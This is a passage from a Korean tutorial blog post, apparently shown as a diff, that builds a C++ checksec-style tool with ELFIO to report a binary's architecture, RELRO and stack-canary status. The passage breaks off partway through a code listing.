+아래는 readelf 프로그램을 이용해 ELF Format을 파싱했을 때와 동일한 결과값을 만들기 위하여 elf_types.hpp에 추가한 사용자 정의 값들의 목록이다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* user add */</span>
+<span class="cp">#define SHT_GNU_ATTRIBUTES  0x6ffffff5      </span><span class="cm">/* Object attributes. */</span><span class="cp">
+#define SHT_GNU_HASH        0x6ffffff6      </span><span class="cm">/* GNU-style hash table. */</span><span class="cp">
+#define SHT_GNU_LIBLIST     0x6ffffff7      </span><span class="cm">/* Prelink library list */</span><span class="cp">
+#define SHT_CHECKSUM        0x6ffffff8      </span><span class="cm">/* Checksum for DSO content. */</span><span class="cp">
+#define SHT_LOSUNW          0x6ffffffa      </span><span class="cm">/* Sun-specific low bound. */</span><span class="cp">
+#define SHT_SUNW_move       0x6ffffffa
+#define SHT_SUNW_COMDAT     0x6ffffffb
+#define SHT_SUNW_syminfo    0x6ffffffc
+#define SHT_GNU_verdef      0x6ffffffd      </span><span class="cm">/* Version definition section. */</span><span class="cp">
+#define SHT_GNU_verneed     0x6ffffffe      </span><span class="cm">/* Version needs section. */</span><span class="cp">
+#define SHT_GNU_versym      0x6fffffff      </span><span class="cm">/* Version symbol table. */</span><span class="cp">
+#define SHT_HISUNW          0x6fffffff      </span><span class="cm">/* Sun-specific high bound. */</span><span class="cp">
+</span>
+<span class="cp">#define PT_GNU_EH_FRAME     0x6474e550      </span><span class="cm">/* GCC .eh_frame_hdr segment */</span><span class="cp">
+#define PT_GNU_STACK        0x6474e551      </span><span class="cm">/* Indicates stack executability */</span><span class="cp">
+#define PT_GNU_RELRO        0x6474e552      </span><span class="cm">/* Read-only after relocation */</span><span class="cp">
+#define PT_LOSUNW           0x6ffffffa
+#define PT_SUNWBSS          0x6ffffffa      </span><span class="cm">/* Sun Specific segment */</span><span class="cp">
+#define PT_SUNWSTACK        0x6ffffffb      </span><span class="cm">/* Stack segment */</span><span class="cp">
+#define PT_HISUNW           0x6fffffff
+</span>
+<span class="cp">#define	DT_NUM              35
+#define DT_VALRNGLO         0x6ffffd00
+#define DT_GNU_PRELINKED    0x6ffffdf5	    </span><span class="cm">/* Prelinking timestamp */</span><span class="cp">
+#define DT_GNU_CONFLICTSZ   0x6ffffdf6	    </span><span class="cm">/* Size of conflict section */</span><span class="cp">
+#define DT_GNU_LIBLISTSZ    0x6ffffdf7	    </span><span class="cm">/* Size of library list */</span><span class="cp">
+#define DT_CHECKSUM         0x6ffffdf8
+#define DT_PLTPADSZ         0x6ffffdf9
+#define DT_MOVEENT          0x6ffffdfa
+#define DT_MOVESZ           0x6ffffdfb
+#define DT_FEATURE_1	    0x6ffffdfc	    </span><span class="cm">/* Feature selection (DTF_*).  */</span><span class="cp">
+#define DT_POSFLAG_1	    0x6ffffdfd	    </span><span class="cm">/* Flags for DT_* entries, effecting the following DT_* entry.  */</span><span class="cp">
+#define DT_SYMINSZ          0x6ffffdfe	    </span><span class="cm">/* Size of syminfo table (in bytes) */</span><span class="cp">
+#define DT_SYMINENT         0x6ffffdff	    </span><span class="cm">/* Entry size of syminfo */</span><span class="cp">
+#define DT_VALRNGHI         0x6ffffdff
+#define DT_ADDRRNGLO        0x6ffffe00
+#define DT_GNU_HASH         0x6ffffef5	    </span><span class="cm">/* GNU-style hash table. */</span><span class="cp">
+#define DT_TLSDESC_PLT      0x6ffffef6
+#define DT_TLSDESC_GOT      0x6ffffef7
+#define DT_GNU_CONFLICT     0x6ffffef8	    </span><span class="cm">/* Start of conflict section */</span><span class="cp">
+#define DT_GNU_LIBLIST      0x6ffffef9	    </span><span class="cm">/* Library list */</span><span class="cp">
+#define DT_CONFIG           0x6ffffefa	    </span><span class="cm">/* Configuration information. */</span><span class="cp">
+#define DT_DEPAUDIT         0x6ffffefb	    </span><span class="cm">/* Dependency auditing. */</span><span class="cp">
+#define DT_AUDIT            0x6ffffefc	    </span><span class="cm">/* Object auditing. */</span><span class="cp">
+#define	DT_PLTPAD           0x6ffffefd	    </span><span class="cm">/* PLT padding. */</span><span class="cp">
+#define	DT_MOVETAB          0x6ffffefe	    </span><span class="cm">/* Move table. */</span><span class="cp">
+#define DT_SYMINFO          0x6ffffeff	    </span><span class="cm">/* Syminfo table. */</span><span class="cp">
+#define DT_ADDRRNGHI        0x6ffffeff
+#define DT_FLAGS_1          0x6ffffffb	    </span><span class="cm">/* State flags, see DF_1_* below. */</span><span class="cp">
+#define	DT_VERDEF           0x6ffffffc	    </span><span class="cm">/* Address of version definition table */</span><span class="cp">
+#define	DT_VERDEFNUM        0x6ffffffd	    </span><span class="cm">/* Number of version definitions */</span><span class="cp">
+#define	DT_VERNEED          0x6ffffffe	    </span><span class="cm">/* Address of table with needed versions */</span><span class="cp">
+#define	DT_VERNEEDNUM       0x6fffffff	    </span><span class="cm">/* Number of needed versions */</span><span class="cp">
+#define DT_VERSYM           0x6ffffff0
+#define DT_RELACOUNT        0x6ffffff9
+#define DT_RELCOUNT         0x6ffffffa
+</span></code></pre></div></div>
+
+<p><br />
+다음으로 Dynamic Section에서 BIND_NOW flag가 있는지 확인을 해야한다. ELFIO에서 Dynamic section을 탐색하면서 BIND_NOW flag를 체크하려면 dynamic_section_accessor 클래스로 Dynamic Section에 접근한 다음, get_entry() 함수를 호출하여 반환된 tag 정보를 확인하면 된다. 아래는 BIND_NOW를 체크하는 코드이다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">SHT_DYNAMIC</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+    <span class="p">{</span>
+        <span class="n">ELFIO</span><span class="o">::</span><span class="n">dynamic_section_accessor</span> <span class="n">dynamic</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entries_num</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span>   <span class="n">tag</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span>   <span class="n">value</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">str</span><span class="p">;</span>
+            <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entry</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">DT_FLAGS</span> <span class="o">==</span> <span class="n">tag</span> <span class="o">&amp;&amp;</span> <span class="n">value</span> <span class="o">==</span> <span class="n">DF_BIND_NOW</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">relro</span> <span class="o">=</span> <span class="s">"Full RELRO"</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+이제 지금까지 확인된 사항들을 모두 결합하여 RELRO 정보를 출력해보자. 아래는 현재까지 확인된 사항들을 모두 결합하여 RELRO 정보까지 출력하는 코드 및 실행 결과이다.</p>
+
+<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main%201.cpp">main.cpp</a></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
+#include &lt;mutex&gt;
+</span>
+<span class="cp">#include &lt;boost/process.hpp&gt;
+#include &lt;boost/asio.hpp&gt;
+#include &lt;boost/thread.hpp&gt;
+#include &lt;boost/chrono.hpp&gt;
+#include &lt;boost/endian/buffers.hpp&gt;
+#include &lt;boost/format.hpp&gt;
+</span>
+<span class="cp">#include "elfio/elfio.hpp"
+#include &lt;elfio/elfio_dump.hpp&gt;
+#include &lt;elfio/elf_types.hpp&gt;
+</span>
+<span class="k">class</span> <span class="nc">ELF</span>
+<span class="p">{</span>
+<span class="nl">private:</span>
+    <span class="n">ELFIO</span><span class="o">::</span><span class="n">elfio</span> <span class="n">reader</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">m_path</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Half</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">machines</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="n">EM_NONE</span><span class="p">,</span> <span class="s">"No machine"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_M32</span><span class="p">,</span> <span class="s">"AT&amp;T WE 32100"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SPARC</span><span class="p">,</span> <span class="s">"SUN SPARC"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_386</span><span class="p">,</span> <span class="s">"Intel 80386"</span> <span class="p">},</span>
+        <span class="p">...</span>
+        <span class="p">{</span> <span class="n">EM_CUDA</span><span class="p">,</span> <span class="s">"NVIDIA CUDA architecture "</span> <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">endians</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="n">ELFDATANONE</span><span class="p">,</span> <span class="s">"None"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">ELFDATA2LSB</span><span class="p">,</span> <span class="s">"Little endian"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">ELFDATA2MSB</span><span class="p">,</span> <span class="s">"Big endian"</span> <span class="p">}</span>
+    <span class="p">};</span>
+
+<span class="nl">public:</span>
+    <span class="n">ELF</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="n">m_path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">reader</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Can't find or process ELF file "</span> <span class="o">&lt;&lt;</span> <span class="n">path</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] '"</span> <span class="o">&lt;&lt;</span> <span class="n">m_path</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"    Arch:     "</span>
+        <span class="o">&lt;&lt;</span> <span class="n">machines</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_machine</span><span class="p">()]</span> 
+        <span class="o">&lt;&lt;</span> <span class="s">"-"</span>
+        <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">reader</span><span class="p">.</span><span class="n">get_class</span><span class="p">()</span> <span class="o">==</span> <span class="n">ELFCLASS32</span> <span class="o">?</span> <span class="s">"32"</span> <span class="o">:</span> <span class="s">"64"</span><span class="p">)</span>
+        <span class="o">&lt;&lt;</span> <span class="s">"-"</span>
+        <span class="o">&lt;&lt;</span> <span class="n">endians</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_encoding</span><span class="p">()]</span>
+        <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"    RELRO:    "</span> <span class="o">&lt;&lt;</span> <span class="n">get_relro</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">get_relro</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">relro</span><span class="p">{</span><span class="s">"No RELRO"</span><span class="p">};</span>
+
+        <span class="c1">// search segment headers</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">segment</span><span class="o">*</span> <span class="n">seg</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">PT_GNU_RELRO</span> <span class="o">==</span> <span class="n">seg</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="n">relro</span> <span class="o">=</span> <span class="s">"Partial RELRO"</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="c1">// search dynamic sections</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">SHT_DYNAMIC</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">dynamic_section_accessor</span> <span class="n">dynamic</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
+                <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entries_num</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">tag</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">value</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">str</span><span class="p">;</span>
+                    <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entry</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="n">DT_FLAGS</span> <span class="o">==</span> <span class="n">tag</span> <span class="o">&amp;&amp;</span> <span class="n">value</span> <span class="o">==</span> <span class="n">DF_BIND_NOW</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">relro</span> <span class="o">=</span> <span class="s">"Full RELRO"</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="n">relro</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">try</span>
+    <span class="p">{</span>
+        <span class="n">ELF</span> <span class="n">e</span><span class="p">{</span><span class="s">"/tmp/hitcon/LAB/lab4/ret2lib"</span><span class="p">};</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">exception</span><span class="o">&amp;</span> <span class="n">e</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Exception: "</span> <span class="o">&lt;&lt;</span> <span class="n">__FUNCTION__</span> <span class="o">&lt;&lt;</span> <span class="s">" "</span> <span class="o">&lt;&lt;</span> <span class="n">e</span><span class="p">.</span><span class="n">what</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><img src="/assets/images/relro.png" alt="full" /></p>
+
+<p><br /></p>
+<h2 id="stack"><strong>STACK</strong></h2>
+
+<p>stack canary 체크를 위해 symbol 정보에서 “__stack_chk_fail” 가 있는지 여부를 확인한다.
+<br />
+symbol 정보를 확인하기 위해서는 dynamic section을 탐색하는 것과 비슷하게, ELFIO에서 지원하는  symbol_section_accessor를 아래와 같이 이용할 수 있다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="n">ELFIO</span><span class="o">::</span><span class="n">symbol_section_accessor</span> <span class="nf">symbol</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><br />
+아래는 symbol을 수집하는 get_symbols() 코드이다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">get_symbols</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">SHT_SYMTAB</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="o">||</span> <span class="n">SHT_DYNSYM</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+        <span class="p">{</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">symbol_section_accessor</span> <span class="n">symbol</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
+            <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">symbol</span><span class="p">.</span><span class="n">get_symbols_num</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">name</span><span class="p">;</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Addr</span> <span class="n">value</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span>  <span class="n">size</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bind</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">type</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">section</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">other</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="n">symbol</span><span class="p">.</span><span class="n">get_symbol</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">bind</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="n">section</span><span class="p">,</span> <span class="n">other</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">name</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span>
+                <span class="p">{</span>
+                    <span class="n">symbols</span><span class="p">.</span><span class="n">emplace</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>   <span class="c1">// end of for</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+symbol_section_accessor를 이용해 symbol을 수집한 후, “__stack_chk_fail”가 있는지 확인한다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">canary</span><span class="p">{</span><span class="s">"No canary found"</span><span class="p">};</span>
+<span class="k">for</span><span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="p">[</span><span class="n">symbol</span><span class="p">,</span> <span class="n">addr</span><span class="p">]</span> <span class="o">:</span> <span class="n">symbols</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">symbol</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"__stack_chk_fail"</span><span class="p">)</span> <span class="o">!=</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">::</span><span class="n">npos</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">canary</span> <span class="o">=</span> <span class="s">"Canary found"</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+아래는 지금까지 확인한 사항들을 모두 결합하여 STACK 까지 출력하는 코드와 실행 결과이다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
+#include &lt;mutex&gt;
+</span>
+<span class="cp">#include &lt;boost/process.hpp&gt;
+#include &lt;boost/asio.hpp&gt;
+#include &lt;boost/thread.hpp&gt;
+#include &lt;boost/chrono.hpp&gt;
+#include &lt;boost/endian/buffers.hpp&gt;
+#include &lt;boost/format.hpp&gt;
+</span>
+<span class="cp">#include "elfio/elfio.hpp"
+#include &lt;elfio/elfio_dump.hpp&gt;
+#include &lt;elfio/elf_types.hpp&gt;
+</span>
+<span class="k">class</span> <span class="nc">ELF</span>
+<span class="p">{</span>
+<span class="nl">private:</span>
+    <span class="n">ELFIO</span><span class="o">::</span><span class="n">elfio</span> <span class="n">reader</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">m_path</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Half</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">machines</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="n">EM_NONE</span><span class="p">,</span> <span class="s">"No machine"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_M32</span><span class="p">,</span> <span class="s">"AT&amp;T WE 32100"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SPARC</span><span class="p">,</span> <span class="s">"SUN SPARC"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_386</span><span class="p">,</span> <span class="s">"Intel 80386"</span> <span class="p">},</span>
+        <span class="p">...</span>
+        <span class="p">{</span> <span class="n">EM_CUDA</span><span class="p">,</span> <span class="s">"NVIDIA CUDA architecture "</span> <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">endians</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="n">ELFDATANONE</span><span class="p">,</span> <span class="s">"None"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">ELFDATA2LSB</span><span class="p">,</span> <span class="s">"Little endian"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">ELFDATA2MSB</span><span class="p">,</span> <span class="s">"Big endian"</span> <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Addr</span><span class="o">&gt;</span> <span class="n">symbols</span><span class="p">;</span>
+<span class="nl">public:</span>
+    <span class="n">ELF</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="n">m_path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">reader</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Can't find or process ELF file "</span> <span class="o">&lt;&lt;</span> <span class="n">path</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] '"</span> <span class="o">&lt;&lt;</span> <span class="n">m_path</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"    Arch:     "</span>
+        <span class="o">&lt;&lt;</span> <span class="n">machines</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_machine</span><span class="p">()]</span> 
+        <span class="o">&lt;&lt;</span> <span class="s">"-"</span>
